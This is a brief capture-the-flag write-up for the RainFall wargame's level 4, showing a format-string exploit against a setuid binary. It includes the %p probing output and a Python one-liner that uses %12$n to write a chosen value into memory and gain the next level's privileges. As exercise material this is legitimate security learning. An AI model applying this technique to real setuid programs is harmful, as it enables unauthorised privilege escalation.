```
level4@RainFall:~$ ll
total 17
dr-xr-x---+ 1 level4 level4   80 Mar  6  2016 ./
dr-x--x--x  1 root   root    340 Sep 23  2015 ../
-rw-r--r--  1 level4 level4  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level4 level4 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level5 users  5252 Mar  6  2016 level4*
-rw-r--r--+ 1 level4 level4   65 Sep 23  2015 .pass
-rw-r--r--  1 level4 level4  675 Apr  3  2012 .profile
```
Ok so we try the same thing as in the last exercise

```
level4@RainFall:~$ ./level4 
BBBB %p %p %p %p %p %p %p %p %p %p %p %p %p %p
BBBB 0xb7ff26b0 0xbffff794 0xb7fd0ff4 (nil) (nil) 0xbffff758 0x804848d 0xbffff550 0x200 0xb7fd1ac0 0xb7ff37d0 0x42424242 0x20702520 0x25207025
```
We can decompile the binary,
We see the exact same thing as in the last exercise, but the number has changed
this time it's the 12th arg
and this time the number we need to put is not 40 but
0x1025544 <=> 16930116
```
level4@RainFall:~$ python -c 'print "\x10\x98\x04\x08" + "%16930112x" + "%12$n"' | ./level4
```
And here we goo, finished.
Why did we not do like the last time,
because we would write too many caracters, and it would provoke a broken pipe error
